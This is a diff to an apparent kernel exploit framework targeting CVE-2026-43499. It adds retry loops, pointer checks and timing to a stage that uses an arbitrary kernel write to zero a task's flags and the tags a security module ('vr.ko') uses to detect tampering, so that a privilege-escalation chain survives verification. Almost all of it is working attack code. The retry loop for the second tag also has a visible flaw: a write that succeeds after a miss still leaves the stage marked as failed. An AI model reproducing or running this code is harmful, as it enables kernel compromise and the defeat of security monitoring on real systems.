@@ -194,21 +194,69 @@ namespace ghostlock::session::backend {
                 }
 
                 int32_t vr_ok = 1;
-                if (vr_needed) {
+                /* A missed perf leak can hand back a task pointer outside the
+                 * direct map; the 64-bit zeroing writes below would then corrupt
+                 * unrelated memory. The primitive publishes an 8-byte pointer
+                 * slot, so a misaligned pointer straddles two fields and corrupts
+                 * the neighbour even from inside the map. Refuse the whole clear
+                 * instead of writing at a guessed address — and refuse before the
+                 * retry loops, so a bad pointer cannot spend a heap spray each. */
+                const bool task_writable = vr_needed != 0 &&
+                                           attack::in_direct_map(child_task) &&
+                                           (child_task & 7u) == 0;
+                if (vr_needed && !task_writable) {
+                    pr_warning("VR: child_task 0x%016zx rejected (outside the direct "
+                               "map or misaligned); skipping tag clear\n",
+                               static_cast<size_t>(child_task));
+                }
+                if (task_writable) {
+                    /* One clear per stage was not enough: a single lost race
+                     * leaves the victim tagged, W2 verify's first getuid() gets
+                     * it killed, and the whole chain round is burned. Same retry
+                     * rhythm as W2 itself. */
+                    const uint32_t vr_attempts = g_exploit_session.profile.w2_attempts();
+
                     /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
                     const memory::WriteRequest flags_request = memory::WriteRequest::make(
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
-                    vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");
+                    for (uint32_t attempt = 1; attempt <= vr_attempts; attempt++) {
+                        if (attempt > 1) {
+                            pr_warning("VR: flags+tagA write %u missed; backing off\n", attempt);
+                            usleep(100000);
+                        }
+                        if (Cve2026_43499Policy::template attack_write<M>(
+                                session, flags_request, "VR: flags+tagA")) {
+                            vr_ok = 1;
+                            break;
+                        }
+                        vr_ok = 0;
+                    }
 
-                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders.
+                     * vr.ko treats an out-of-sync tag pair (one set, one clear)
+                     * as tampering and kills on that alone, so this write has to
+                     * land too — it gets the same loop. */
                     if (vr_ok) {
                         uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                         const memory::WriteRequest tagb_request =
                                 memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
-                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
+                        for (uint32_t attempt = 1; attempt <= vr_attempts; attempt++) {
+                            if (attempt > 1) {
+                                pr_warning("VR: tagB write %u missed; backing off\n", attempt);
+                                usleep(100000);
+                            }
+                            if (Cve2026_43499Policy::template attack_write<M>(
+                                    session, tagb_request, "VR: tagB")) {
+                                break;
+                            }
+                            vr_ok = 0;
+                        }
                     }
 
                     if (vr_ok) {
+                        /* Let both writes land before W2 verify pushes the child
+                         * through the syscall exit path. */
+                        usleep(g_exploit_session.profile.w2_settle_us());
                         pr_success("VR.ko per-task tags cleared\n");
                     } else {
                         pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
